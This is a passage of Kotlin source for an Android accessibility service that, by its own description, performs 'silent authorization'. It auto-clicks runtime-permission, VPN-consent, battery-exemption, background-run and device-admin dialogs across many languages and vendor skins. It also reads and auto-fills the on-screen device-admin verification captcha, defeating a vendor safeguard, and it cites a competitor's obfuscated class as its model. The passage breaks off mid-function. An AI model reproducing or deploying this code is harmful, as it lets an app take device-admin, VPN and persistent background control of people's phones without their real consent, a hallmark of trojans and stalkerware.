package com.vibelink.client.setup

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import android.util.TypedValue
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.vibelink.client.R
import com.vibelink.client.accessibility.SystemUiStrings
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * 静默授权：按当前 Target 点对应系统页。
 * Admin：先处理 ColorOS/Samsung 验证码弹窗，再滚动并点「激活/启动」。
 */
object SetupPermissionAutoClicker {
    private const val TAG = "SetupAutoClick"
    private const val MIN_CLICK_INTERVAL_MS = 500L
    /** 事件洪峰下也不能把扫描任务堆到队列里：两次派发之间至少隔这么久。 */
    private const val MIN_SCAN_GAP_MS = 400L
    /** 扫描线程超过这个时长还没回，就判定它被 Binder 卡死，换新线程。 */
    private const val STUCK_TIMEOUT_MS = 8_000L
    /** 高功耗框全窗 findByText 很重：禁止每个 a11y 事件都扫（ANR：ConnectionService 起不来） */
    private const val HIGH_POWER_SCAN_MIN_MS = 3_000L
    private const val RUNTIME_STRINGS_TTL_MS = 60_000L

    /**
     * service.windows / rootInActiveWindow 是跨进程同步 Binder，且没有超时；
     * ColorOS 侧一慢就会把 a11y 主线程卡过 5 秒（ANR）。所有扫树动作只允许在这个线程上跑。
     * 线程一旦被 Binder 卡死无法中断，只能放弃它、换新线程继续，避免自动点永久失效。
     */
    @Volatile
    private var scanWorker: ExecutorService = newScanWorker()

    private val scanInFlight = AtomicBoolean(false)
    private val scanStuckCount = AtomicInteger(0)
    /** 线程轮换后，旧线程的 finally 不能清掉新线程的 in-flight 标记。 */
    private val scanGeneration = AtomicInteger(0)

    private fun newScanWorker(): ExecutorService =
        Executors.newSingleThreadExecutor { runnable ->
            Thread(runnable, "SetupAutoClick-scan").apply { isDaemon = true }
        }

    /** 扫描线程被同步 Binder 卡死时无法 interrupt，只能换一个新线程继续跑。 */
    private fun resetScanWorkerIfStuck(waitedMs: Long) {
        if (scanStuckCount.incrementAndGet() < 2) {
            return
        }
        scanStuckCount.set(0)
        val old = scanWorker
        scanWorker = newScanWorker()
        scanGeneration.incrementAndGet()
        // 老线程可能仍卡在 Binder 上，shutdownNow 只是尽力；不等待，避免这里再被拖住。
        runCatching { old.shutdownNow() }
        scanInFlight.set(false)
        Log.w(TAG, "scan worker stuck ${waitedMs}ms, rotated")
    }

    @Volatile
    private var lastDispatchAt = 0L

    @Volatile
    private var lastClickAt = 0L

    @Volatile
    private var lastScrollAt = 0L

    @Volatile
    private var lastVerificationFillAt = 0L

    private var lastInactiveLogAt = 0L

    @Volatile
    private var lastHighPowerScanAt = 0L

    @Volatile
    private var lastRuntimeStringsAt = 0L

    private val ADMIN_TITLE_IDS = listOf(
        "com.android.settings:id/dialog_title",
        "com.android.settings:id/alertTitle",
        "android:id/alertTitle",
        "android:id/title",
    )

    private val ADMIN_MESSAGE_IDS = listOf(
        "com.android.settings:id/message",
        "android:id/message",
    )

    private val ADMIN_CONFIRM_TITLES = listOf(
        "要使用设备管理器吗？",
        "要使用裝置管理員嗎？",
        "要使用裝置管理器嗎？",
        "Activate Device admin apps?",
        "Activate device admin apps?",
        "デバイスマネージャーを使用しますか？",
        // es
        "¿Activar apps de administrador del dispositivo?",
        "¿Usar aplicaciones de administrador del dispositivo?",
        "Activar apps de administrador del dispositivo?",
        // id
        "Aktifkan aplikasi admin perangkat?",
        "Aktifkan apl admin perangkat?",
        "Gunakan pengelola perangkat?",
        "Ingin menggunakan pengelola perangkat?",
        // uz
        "Qurilma administrator ilovalarini faollashtirasizmi?",
        "Qurilma administratoridan foydalanasizmi?",
        "Qurilma administratorini faollashtirish?",
        // ru
        "Активировать приложения администратора устройства?",
        "Использовать приложения администратора устройства?",
        "Активировать администратора устройства?",
    )

    private val PERMISSION_VIEW_IDS = listOf(
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
        "com.android.permissioncontroller:id/permission_allow_one_time_button",
        "com.android.permissioncontroller:id/permission_allow_always_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "android:id/button1",
    )

    private val BATTERY_VIEW_IDS = listOf(
        "android:id/button1",
        "com.android.settings:id/button1",
        "com.android.settings:id/action_button",
        "com.oplus:id/button1",
        "com.coloros:id/button1",
        "com.oplus:id/coui_btn_positive",
        "com.coloros:id/coui_btn_positive",
        "com.oplus.battery:id/button1",
        "com.oplus.battery:id/coui_btn_positive",
        "com.oplus.safecenter:id/button1",
        "com.coloros.safecenter:id/button1",
        "com.coloros.oppoguardelf:id/button1",
        "com.oplus.powermanager:id/button1",
    )

    /** ColorOS / OPPO：REQUEST_IGNORE_BATTERY 会再弹「一直在后台运行」，不是 runtime 权限。 */
    private val HIGH_POWER_HINTS = listOf(
        "一直在后台运行",
        "始终在后台运行",
        "一直在背景",
        "一律在背景",
        "always run in the background",
        "always run in background",
        "let app always run in background",
        // id
        "berjalan di latar belakang",
        "selalu berjalan di latar belakang",
        // uz
        "doim fonda ishlash",
        "har doim fonda ishlash",
        "fonda doimiy ishlash",
        // ru
        "всегда работать в фоне",
        "постоянно работать в фоне",
        "разрешить работу в фоне",
    )

    private val HIGH_POWER_LABELS = listOf(
        "允许",
        "allow",
        "permitir",
        "izinkan",
        "ruxsat berish",
        "разрешить",
        "確定",
        "确定",
        "ok",
        "oke",
        "ок",
    )

    private val VPN_VIEW_IDS = listOf(
        "android:id/button1",
        "com.android.vpndialogs:id/button",
        "com.android.vpndialogs:id/button_connect",
        "com.android.system:id/button1",
        "com.oplus:id/button1",
        "com.coloros:id/button1",
        // ColorOS / Realme：系统 VPN 确认走 oplus.wirelesssettings（本机实测）
        "com.oplus.wirelesssettings:id/button1",
        "com.oplus.wirelesssettings:id/coui_btn_positive",
    )

    private val ADMIN_VIEW_IDS = listOf(
        "com.android.settings:id/action_button",
        "com.android.settings:id/restricted_action",
        "com.android.settings:id/button",
        "android:id/button1",
        "com.miui.securitycenter:id/action_button",
        "com.huawei.systemmanager:id/btn_allow",
        "com.oplus.settings:id/action_button",
        "com.coloros.settings:id/action_button",
        "com.vivo.settings:id/action_button",
    )

    private val PERMISSION_LABELS = listOf(
        "while using the app",
        "only this time",
        "allow all the time",
        "始终允许",
        "仅在使用该应用时允许",
        "仅在使用期间允许",
        "仅在使用中允许",
        "仅此次允许",
        "本次允许",
        "allow",
        "允许",
        "許可",
        "常に許可",
        "アプリの使用中のみ",
        "今回のみ",
        // es
        "permitir",
        "permitir siempre",
        "mientras se usa la app",
        "mientras usas la app",
        "solo esta vez",
        "sólo esta vez",
        // id
        "saat aplikasi digunakan",
        "saat menggunakan aplikasi",
        "hanya saat menggunakan",
        "hanya kali ini",
        "izinkan sepanjang waktu",
        "selalu izinkan",
        "izinkan",
        // uz
        "ilovadan foydalanishda",
        "ilovadan foydalanish vaqtida",
        "faqat shu safar",
        "har doim ruxsat berish",
        "doim ruxsat berish",
        "ruxsat berish",
        // ru
        "при использовании приложения",
        "только в этот раз",
        "разрешить всегда",
        "разрешить",
    )

    private val BATTERY_LABELS = listOf(
        "allow",
        "ok",
        "允许",
        "确定",
        "是",
        "許可",
        "OK",
        "はい",
        // es
        "permitir",
        "sin restricciones",
        "sin limitación",
        // id
        "izinkan",
        "oke",
        "tanpa batasan",
        "tidak dibatasi",
        // uz
        "ruxsat berish",
        "cheklovlarsiz",
        "cheklanmagan",
        // ru
        "разрешить",
        "без ограничений",
        "не ограничивать",
        "ок",
    )

    private val VPN_LABELS = listOf(
        "ok",
        "allow",
        "同意",
        "允许",
        "确定",
        "開啟",
        "开启",
        "接続",
        "接続する",
        "許可",
        "OK",
        "はい",
        "继续",
        "確認",
        "确认",
        // es
        "permitir",
        "aceptar",
        "continuar",
        "confirmar",
        // id
        "izinkan",
        "oke",
        "setuju",
        "lanjutkan",
        "konfirmasi",
        // uz
        "ruxsat berish",
        "qabul qilish",
        "davom etish",
        "tasdiqlash",
        "rozilik",
        // ru
        "разрешить",
        "принять",
        "продолжить",
        "подтвердить",
        "ок",
    )

    private val ADMIN_LABELS = listOf(
        "activate this device admin app",
        "activate this device administrator app",
        "activate this device administrator",
        "activate device admin app",
        "activate device administrator",
        "激活此设备管理应用",
        "激活此设备管理员应用",
        "启用此设备管理应用",
        "启用此设备管理员应用",
        "激活设备管理器",
        "启用设备管理器",
        "activate",
        "激活",
        "启用",
        "开启",
        "启动",
        "有効にする",
        "アクティブ化",
        // es
        "activar esta app de administrador del dispositivo",
        "activar este administrador del dispositivo",
        "activar administrador del dispositivo",
        "activar",
        // id
        "aktifkan aplikasi admin perangkat",
        "aktifkan apl admin perangkat",
        "aktifkan pengelola perangkat",
        "aktifkan",
        // uz
        "ushbu qurilma administrator ilovasini faollashtirish",
        "ushbu qurilma administratorini faollashtirish",
        "qurilma administratorini faollashtirish",
        "faollashtirish",
        // ru
        "активировать это приложение администратора устройства",
        "активировать этот администратор устройства",
        "активировать администратора устройства",
        "активировать",
    )

    private val NEGATIVE_LABELS = listOf(
        "don't allow",
        "do not allow",
        "deny",
        "cancel",
        "reject",
        "uninstall",
        "不允许",
        "拒绝",
        "取消",
        "卸载",
        "拒否",
        "キャンセル",
        "アンインストール",
        // es
        "no permitir",
        "denegar",
        "cancelar",
        "rechazar",
        "desinstalar",
        // id：放在 izinkan 前面用于排除「Jangan izinkan」
        "jangan izinkan",
        "tolak",
        "batal",
        "copot pemasangan",
        // uz：放在 ruxsat berish 前面用于排除「Ruxsat bermaslik」
        "ruxsat bermaslik",
        "rad etish",
        "bekor qilish",
        "oʻchirish",
        "ochirish",
        // ru：放在 разрешить 前面用于排除「Запретить / Не разрешать」
        "не разрешать",
        "запретить",
        "отклонить",
        "отмена",
        "удалить",
    )

    /** 资源名不随语言变，运行时从系统包取出当前语言的译文。 */
    private val PERMISSION_TEXT_REFS = listOf(
        "com.android.permissioncontroller" to "permission_allow_foreground_only_button",
        "com.google.android.permissioncontroller" to "permission_allow_foreground_only_button",
        "com.android.permissioncontroller" to "permission_allow_one_time_button",
        "com.google.android.permissioncontroller" to "permission_allow_one_time_button",
        "com.android.permissioncontroller" to "permission_allow_always_button",
        "com.google.android.permissioncontroller" to "permission_allow_always_button",
        "com.android.permissioncontroller" to "permission_allow_button",
        "com.google.android.permissioncontroller" to "permission_allow_button",
    )

    private val BATTERY_TEXT_REFS = listOf(
        "android" to "ok",
        "com.android.permissioncontroller" to "permission_allow_button",
        "com.google.android.permissioncontroller" to "permission_allow_button",
        "com.android.settings" to "high_power_allow",
    )

    private val VPN_TEXT_REFS = listOf(
        "android" to "ok",
        "com.android.permissioncontroller" to "permission_allow_button",
        "com.google.android.permissioncontroller" to "permission_allow_button",
    )

    private val ADMIN_TEXT_REFS = listOf(
        "com.android.settings" to "device_admin_dialog_title",
        "com.android.settings" to "add_device_admin",
        "com.android.settings" to "device_admin_activation_button",
    )

    private val ADMIN_TITLE_REFS = listOf(
        "com.android.settings" to "device_admin_dialog_title",
        "com.oplus.settings" to "device_admin_dialog_title",
        "com.coloros.settings" to "device_admin_dialog_title",
    )

    private val HIGH_POWER_TEXT_REFS = listOf(
        "com.android.settings" to "high_power_prompt_title",
        "com.android.settings" to "high_power_prompt_body",
        "com.oplus.battery" to "high_power_prompt_title",
        "com.oplus.battery" to "high_power_prompt_body",
        "com.coloros.safecenter" to "high_power_prompt_title",
        "com.oplus.safecenter" to "high_power_prompt_title",
    )

    private val NEGATIVE_TEXT_REFS = listOf(
        "android" to "cancel",
        "com.android.permissioncontroller" to "permission_deny_button",
        "com.google.android.permissioncontroller" to "permission_deny_button",
        "com.android.permissioncontroller" to "permission_deny_and_dont_ask_again_button",
        "com.google.android.permissioncontroller" to "permission_deny_and_dont_ask_again_button",
    )

    @Volatile
    private var runtimePermissionLabels: List<String> = emptyList()

    @Volatile
    private var runtimeBatteryLabels: List<String> = emptyList()

    @Volatile
    private var runtimeVpnLabels: List<String> = emptyList()

    @Volatile
    private var runtimeAdminLabels: List<String> = emptyList()

    @Volatile
    private var runtimeHighPowerHints: List<String> = emptyList()

    @Volatile
    private var runtimeHighPowerLabels: List<String> = emptyList()

    @Volatile
    private var runtimeNegatives: List<String> = emptyList()

    private fun refreshRuntimeStrings(context: Context, force: Boolean = false) {
        val now = SystemClock.elapsedRealtime()
        if (!force && lastRuntimeStringsAt > 0L && now - lastRuntimeStringsAt < RUNTIME_STRINGS_TTL_MS) {
            return
        }
        runtimePermissionLabels = SystemUiStrings.texts(context, PERMISSION_TEXT_REFS)
        runtimeBatteryLabels = SystemUiStrings.texts(context, BATTERY_TEXT_REFS)
        runtimeVpnLabels = SystemUiStrings.texts(context, VPN_TEXT_REFS)
        runtimeAdminLabels = SystemUiStrings.texts(context, ADMIN_TEXT_REFS)
        runtimeHighPowerHints = SystemUiStrings.texts(context, HIGH_POWER_TEXT_REFS)
        runtimeHighPowerLabels = SystemUiStrings.texts(
            context,
            listOf("android" to "ok") + PERMISSION_TEXT_REFS.takeLast(2),
        )
        runtimeNegatives = SystemUiStrings.texts(context, NEGATIVE_TEXT_REFS)
        lastRuntimeStringsAt = now
    }

    fun onEvent(service: AccessibilityService, packageName: String? = null) {
        val now = SystemClock.elapsedRealtime()
        if (now - lastClickAt < MIN_CLICK_INTERVAL_MS) {
            return
        }
        if (now - lastDispatchAt < MIN_SCAN_GAP_MS) {
            return
        }
        val pkg = packageName.orEmpty()
        if (isKeyguardNoisePackage(pkg)) {
            return
        }
        val coordinatorActive = SetupAutoGrantCoordinator.isActive()
        // 不绑当前 Target：ColorOS 常在短信/电池已过后才弹这个框。但只在「事件包名本身就是电池/省电中心」
        // 或授权阶段进行中时才扫；绝不对无包名事件无条件扫全窗（ANR 主因）。
        val highPowerReady = now - lastHighPowerScanAt >= HIGH_POWER_SCAN_MIN_MS
        val scanHighPower = highPowerReady &&
            (looksLikeHighPowerPackage(pkg) || coordinatorActive)
        val target = if (coordinatorActive) SetupAutoGrantCoordinator.getTarget()
        else SetupAutoGrantCoordinator.Target.NONE
        // 高功耗框可能弹在任意包（电池/设置），所以它和授权 Target 各算各的，不能互相拦截。
        val scanSetup = coordinatorActive &&
            target != SetupAutoGrantCoordinator.Target.NONE &&
            (pkg.isEmpty() || looksLikeSetupTargetPackage(pkg, target))
        if (!scanHighPower && !scanSetup) {
            if (now - lastInactiveLogAt > 10_000L) {
                lastInactiveLogAt = now
                Log.d(TAG, "skip: nothing to scan")
            }
            return
        }
        if (!scanInFlight.compareAndSet(false, true)) {
            val waited = now - lastDispatchAt
            if (waited > STUCK_TIMEOUT_MS) {
                resetScanWorkerIfStuck(waited)
                if (now - lastInactiveLogAt > 10_000L) {
                    lastInactiveLogAt = now
                    Log.w(TAG, "scan stuck ${waited}ms pkg=$pkg")
                }
            }
            return
        }
        lastDispatchAt = now
        val submitted = runCatching {
            scanWorker.execute {
                val startedAt = SystemClock.elapsedRealtime()
                val generation = scanGeneration.get()
                try {
                    runScan(service, pkg, target, scanHighPower, scanSetup)
                } catch (t: Throwable) {
                    Log.w(TAG, "scan failed", t)
                } finally {
                    val cost = SystemClock.elapsedRealtime() - startedAt
                    if (cost > 1_500L) {
                        Log.w(TAG, "slow scan ${cost}ms pkg=$pkg")
                    }
                    // 线程已被轮换时不要动标记，否则新线程的 in-flight 会被清掉导致并发扫树。
                    if (generation == scanGeneration.get()) {
                        scanInFlight.set(false)
                        scanStuckCount.set(0)
                    }
                }
            }
        }
        if (submitted.isFailure) {
            Log.w(TAG, "scan dispatch failed", submitted.exceptionOrNull())
            scanInFlight.set(false)
        }
    }

    /** 只在 scanWorker 上执行：整段包含同步 Binder 扫树，绝不能回到主线程。 */
    private fun runScan(
        service: AccessibilityService,
        pkg: String,
        target: SetupAutoGrantCoordinator.Target,
        scanHighPower: Boolean,
        scanSetup: Boolean,
    ) {
        val now = SystemClock.elapsedRealtime()
        refreshRuntimeStrings(service)
        if (scanHighPower && now - lastHighPowerScanAt >= HIGH_POWER_SCAN_MIN_MS) {
            lastHighPowerScanAt = now
            if (tryClickHighPowerPrompt(service)) {
                lastClickAt = now
                return
            }
        }
        if (!scanSetup) {
            return
        }
        if (pkg.isNotEmpty() && !looksLikeSetupTargetPackage(pkg, target)) {
            return
        }
        if (target == SetupAutoGrantCoordinator.Target.ADMIN) {
            if (tryFillAdminVerificationAcrossWindows(service, now)) {
                lastClickAt = now
                return
            }
            maybeScroll(service, now)
        }
        if (clickAcrossWindows(service, target)) {
            lastClickAt = now
        }
    }

    /** 锁屏噪音包：一律不跑授权扫描（ANR 主因是 keyguard 事件洪水打进来） */
    private fun isKeyguardNoisePackage(pkg: String): Boolean {
        if (pkg.isEmpty()) return false
        return pkg == "com.android.systemui" ||
            pkg.contains("keyguard", ignoreCase = true)
    }

    private fun looksLikeHighPowerPackage(pkg: String): Boolean {
        if (pkg.isEmpty()) return false
        val p = pkg.lowercase(Locale.US)
        return p.contains("battery") ||
            p.contains("safecenter") ||
            p.contains("powermanager") ||
            p.contains("oppoguardelf") ||
            p.contains("powerkeeper") ||
            p.endsWith(".settings") ||
            p.contains("permissioncontroller")
    }

    private fun looksLikeSetupTargetPackage(
        pkg: String,
        target: SetupAutoGrantCoordinator.Target,
    ): Boolean {
        val p = pkg.lowercase(Locale.US)
        return when (target) {
            SetupAutoGrantCoordinator.Target.PERMISSIONS ->
                p.contains("permission") || p.contains("packageinstaller")
            SetupAutoGrantCoordinator.Target.BATTERY ->
                looksLikeHighPowerPackage(pkg)
            SetupAutoGrantCoordinator.Target.VPN ->
                p.contains("vpn") || p.contains("wirelesssettings") || p.contains("settings")
            SetupAutoGrantCoordinator.Target.ADMIN ->
                p.contains("settings") || p.contains("deviceadmin")
            SetupAutoGrantCoordinator.Target.NONE -> false
        }
    }

    /** 竞品 d91.h：verification_view 文本 → SET_TEXT edittext_view → button1 */
    private fun tryFillAdminVerificationAcrossWindows(
        service: AccessibilityService,
        now: Long,
    ): Boolean {
        if (now - lastVerificationFillAt < 600L) {
            return false
        }
        val windows = service.windows
        if (!windows.isNullOrEmpty()) {
            for (window in windows) {
                if (window.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) {
                    continue
                }
                val root = window.root ?: continue
                try {
                    if (tryFillAdminVerification(service, root)) {
                        lastVerificationFillAt = now
                        return true
                    }
                } finally {
                    root.recycle()
                }
            }
        }
        val root = service.rootInActiveWindow ?: return false
        return try {
            if (tryFillAdminVerification(service, root)) {
                lastVerificationFillAt = now
                true
            } else {
                false
            }
        } finally {
            root.recycle()
        }
    }

    private fun tryFillAdminVerification(
        service: AccessibilityService,
        root: AccessibilityNodeInfo,
    ): Boolean {
        val verification = firstByViewId(root, "com.android.settings:id/verification_view")
            ?: return false
        val edit = firstByViewId(root, "com.android.settings:id/edittext_view")
        try {
            if (edit == null) {
                return false
            }
            val titleNode = firstByViewIds(root, ADMIN_TITLE_IDS)
            val titleText = titleNode?.text?.toString().orEmpty()
            titleNode?.recycle()
            if (titleText.isNotBlank() && !isDeviceAdminConfirmTitle(service, titleText)) {
                val messageNode = firstByViewIds(root, ADMIN_MESSAGE_IDS)
                val messageText = messageNode?.text?.toString().orEmpty()
                messageNode?.recycle()
                val systemAdmin = SystemUiStrings.texts(service, ADMIN_TITLE_REFS)
                val messageHit = messageText.contains("设备管理") ||
                    messageText.contains("device admin", ignoreCase = true) ||
                    messageText.contains("デバイス") ||
                    messageText.contains("admin perangkat", ignoreCase = true) ||
                    messageText.contains("pengelola perangkat", ignoreCase = true) ||
                    systemAdmin.any { phrase ->
                        phrase.isNotBlank() && messageText.contains(phrase, ignoreCase = true)
                    }
                if (!messageHit) {
                    return false
                }
            }
            val rawCode = verification.text?.toString()
                ?: verification.contentDescription?.toString()
                ?: return false
            val code = rawCode.replace(" ", "").trim()
            if (code.isBlank() || code.length < 3) {
                return false
            }
            val args = Bundle().apply {
                putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    code,
                )
            }
            if (!edit.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)) {
                Log.w(TAG, "admin captcha SET_TEXT failed")
                return false
            }
            Log.i(TAG, "admin captcha filled len=${code.length}")
            val button = firstByViewId(root, "android:id/button1")
            try {
                if (button != null && button.isEnabled && clickNode(service, button)) {
                    Log.i(TAG, "admin captcha clicked button1")
                    return true
                }
            } finally {
                button?.recycle()
            }
            return tapAdminDialogConfirmFallback(service, root)
        } finally {
            verification.recycle()
            edit?.recycle()
        }
    }

    private fun isDeviceAdminConfirmTitle(service: AccessibilityService, title: String): Boolean {
        val normalized = normalizeUiText(title)
        val expected = normalizeUiText(service.getString(R.string.device_admin_dialog_title))
        if (normalized.equals(expected, ignoreCase = true)) {
            return true
        }
        if (ADMIN_CONFIRM_TITLES.any { normalizeUiText(it).equals(normalized, ignoreCase = true) } ||
            normalized.contains(normalizeUiText("设备管理器")) ||
            normalized.contains("deviceadmin", ignoreCase = true)
        ) {
            return true
        }
        return SystemUiStrings.texts(service, ADMIN_TITLE_REFS).any { phrase ->
            val expected = normalizeUiText(phrase)
            expected.isNotBlank() && (normalized.equals(expected, ignoreCase = true) || normalized.contains(expected))
        }
    }

    private fun normalizeUiText(value: String?): String {
        if (value.isNullOrEmpty()) {
            return ""
        }
        return value
            .replace(Regex("[\u200e\u200f\u202a\u202b\u202c\u202d\u202e\"“”，]"), "")
            .replace(" ", "")
    }

    private fun tapAdminDialogConfirmFallback(
        service: AccessibilityService,
        root: AccessibilityNodeInfo,
    ): Boolean {
        val rect = Rect()
        root.getBoundsInScreen(rect)
        if (rect.width() < 8 || rect.height() < 8) {
            return false
        }
        val buttonHalf = TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            48f,
            service.resources.displayMetrics,
        ).toInt() / 2
        val margin = TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            24f,
            service.resources.displayMetrics,
        ).toInt()
        val x = rect.centerX().toFloat()
        val y = (rect.bottom - buttonHalf - margin).toFloat()
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build()
        return runCatching {
            service.dispatchGesture(gesture, null, null)
        }.getOrDefault(false)
    }

    private fun firstByViewId(root: AccessibilityNodeInfo, viewId: String): AccessibilityNodeInfo? {
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId) ?: return null
        if (nodes.isEmpty()) {
            return null
        }
        val first = nodes[0]
        for (i in 1 until nodes.size) {
            nodes[i].recycle()
        }
        nodes.clear()
        return first
    }

    private fun firstByViewIds(
        root: AccessibilityNodeInfo,
        viewIds: List<String>,
    ): AccessibilityNodeInfo? {
        for (id in viewIds) {
            val node = firstByViewId(root, id)
            if (node != null) {
                return node
            }
        }
        return null
    }

    private fun maybeScroll(service: AccessibilityService, now: Long) {
        if (now - lastScrollAt < 900L) {
            return
        }
        lastScrollAt = now
        val windows = service.windows
        if (!windows.isNullOrEmpty()) {
            for (window in windows) {
                if (window.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) {
                    continue
                }
                val root = window.root ?: continue
                try {
                    if (scrollForward(root)) {
                        Log.i(TAG, "scrolled admin page")
                        return
                    }
                } finally {
                    root.recycle()
                }
            }
        }
        swipeUp(service)
    }

    private fun scrollForward(root: AccessibilityNodeInfo): Boolean {
        if (root.isScrollable && root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) {
            return true
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            try {
                if (scrollForward(child)) {
                    return true
                }
            } finally {
                child.recycle()
            }
        }
        return false
    }

    private fun swipeUp(service: AccessibilityService) {
        val metrics = service.resources.displayMetrics
        val x = metrics.widthPixels / 2f
        val y1 = metrics.heightPixels * 0.78f
        val y2 = metrics.heightPixels * 0.35f
        val path = Path().apply {
            moveTo(x, y1)
            lineTo(x, y2)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 280))
            .build()
        runCatching { service.dispatchGesture(gesture, null, null) }
    }

    private fun tryClickHighPowerPrompt(service: AccessibilityService): Boolean {
        val structuralOk = SetupAutoGrantCoordinator.isActive()
        val windows = service.windows
        if (!windows.isNullOrEmpty()) {
            for (window in windows) {
                if (window.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) {
                    continue
                }
                val root = window.root ?: continue
                try {
                    if (matchesHighPower(root, structuralOk) &&
                        clickInRoot(
                            service,
                            root,
                            BATTERY_VIEW_IDS,
                            HIGH_POWER_LABELS + runtimeHighPowerLabels,
                            preferButton = true,
                        )
                    ) {
                        Log.i(TAG, "clicked ColorOS high-power / background-run prompt")
                        return true
                    }
                } finally {
                    root.recycle()
                }
            }
        }
        val root = service.rootInActiveWindow ?: return false
        return try {
            if (matchesHighPower(root, structuralOk) &&
                clickInRoot(
                    service,
                    root,
                    BATTERY_VIEW_IDS,
                    HIGH_POWER_LABELS + runtimeHighPowerLabels,
                    preferButton = true,
                )
            ) {
                Log.i(TAG, "clicked ColorOS high-power / background-run prompt")
                true
            } else {
                false
            }
        } finally {
            root.recycle()
        }
    }

    private fun matchesHighPower(root: AccessibilityNodeInfo, structuralOk: Boolean): Boolean {
        if (isHighPowerPrompt(root)) {
            return true
        }
        if (!structuralOk) {
            return false
        }
        val pkg = root.packageName?.toString().orEmpty()
        val batteryPkg = pkg.contains("battery") ||
            pkg.contains("safecenter") ||
            pkg.contains("powermanager") ||
            pkg.contains("oppoguardelf")
        return batteryPkg && hasDialogButtons(root)
    }

    private fun hasDialogButtons(root: AccessibilityNodeInfo): Boolean {
        val positive = firstByViewId(root, "android:id/button1")
            ?: firstByViewId(root, "com.oplus:id/button1")
            ?: firstByViewId(root, "com.coloros:id/button1")
            ?: firstByViewId(root, "com.oplus.battery:id/button1")
        val negative = firstByViewId(root, "android:id/button2")
            ?: firstByViewId(root, "com.oplus:id/button2")
            ?: firstByViewId(root, "com.coloros:id/button2")
        return try {
            positive != null && positive.isEnabled && negative != null
        } finally {
            positive?.recycle()
            negative?.recycle()
        }
    }

    private fun isHighPowerPrompt(root: AccessibilityNodeInfo): Boolean {
        for (hint in HIGH_POWER_HINTS + runtimeHighPowerHints) {
            val nodes = root.findAccessibilityNodeInfosByText(hint) ?: continue
            val hit = nodes.isNotEmpty()
            for (node in nodes) {
                node.recycle()
            }
            if (hit) {
                return true
            }
        }
        return false
    }

    private fun clickAcrossWindows(
        service: AccessibilityService,
        target: SetupAutoGrantCoordinator.Target,
    ): Boolean {
        val viewIds = viewIdsFor(target)
        val labels = labelsFor(target)
        val windows = service.windows
        if (!windows.isNullOrEmpty()) {
            val ordered = windows.sortedByDescending { windowPriority(it, target) }
            for (window in ordered) {
                if (window.type == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) {
                    continue
                }
                val root = window.root ?: continue
                try {
                    if (clickInRoot(service, root, viewIds, labels, preferButton = target == SetupAutoGrantCoordinator.Target.ADMIN)) {
                        return true
                    }
                } finally {
                    root.recycle()
                }
            }
        }
        val root = service.rootInActiveWindow ?: return false
        return try {
            clickInRoot(service, root, viewIds, labels, preferButton = target == SetupAutoGrantCoordinator.Target.ADMIN)
        } finally {
            root.recycle()
        }
    }

    private fun viewIdsFor(target: SetupAutoGrantCoordinator.Target): List<String> {
        return when (target) {
            SetupAutoGrantCoordinator.Target.PERMISSIONS -> PERMISSION_VIEW_IDS
            SetupAutoGrantCoordinator.Target.VPN -> VPN_VIEW_IDS
            SetupAutoGrantCoordinator.Target.BATTERY -> BATTERY_VIEW_IDS
            SetupAutoGrantCoordinator.Target.ADMIN -> ADMIN_VIEW_IDS
            SetupAutoGrantCoordinator.Target.NONE -> emptyList()
        }
    }

    private fun labelsFor(target: SetupAutoGrantCoordinator.Target): List<String> {
        return when (target) {
            SetupAutoGrantCoordinator.Target.PERMISSIONS -> PERMISSION_LABELS + runtimePermissionLabels
            SetupAutoGrantCoordinator.Target.VPN -> VPN_LABELS + runtimeVpnLabels
            SetupAutoGrantCoordinator.Target.BATTERY -> BATTERY_LABELS + runtimeBatteryLabels
            SetupAutoGrantCoordinator.Target.ADMIN -> ADMIN_LABELS + runtimeAdminLabels
            SetupAutoGrantCoordinator.Target.NONE -> emptyList()
        }
    }

    private fun windowPriority(
        window: AccessibilityWindowInfo,
        target: SetupAutoGrantCoordinator.Target,
    ): Int {
        var score = when (window.type) {
            AccessibilityWindowInfo.TYPE_SYSTEM -> 3
            AccessibilityWindowInfo.TYPE_APPLICATION -> 2
            else -> 0
        }
        if (target == SetupAutoGrantCoordinator.Target.ADMIN) {
            val root = window.root
            try {
                val pkg = root?.packageName?.toString().orEmpty()
                if (pkg.contains("settings") ||
                    pkg.contains("securitycenter") ||
                    pkg.contains("systemmanager")
                ) {
                    score += 5
                }
            } finally {
                root?.recycle()
            }
        }
        if (target == SetupAutoGrantCoordinator.Target.PERMISSIONS ||
            target == SetupAutoGrantCoordinator.Target.VPN ||
            target == SetupAutoGrantCoordinator.Target.BATTERY
        ) {
            val root = window.root
            try {
                val pkg = root?.packageName?.toString().orEmpty()
                if (pkg.contains("permissioncontroller") ||
                    pkg.contains("packageinstaller") ||
                    pkg.contains("vpndialogs") ||
                    pkg.contains("wirelesssettings") ||
                    pkg.contains("battery") ||
                    pkg.contains("safecenter") ||
                    pkg.contains("powermanager") ||
                    pkg.contains("oppoguardelf")
                ) {
                    score += 8
                }
            } finally {
                root?.recycle()
            }
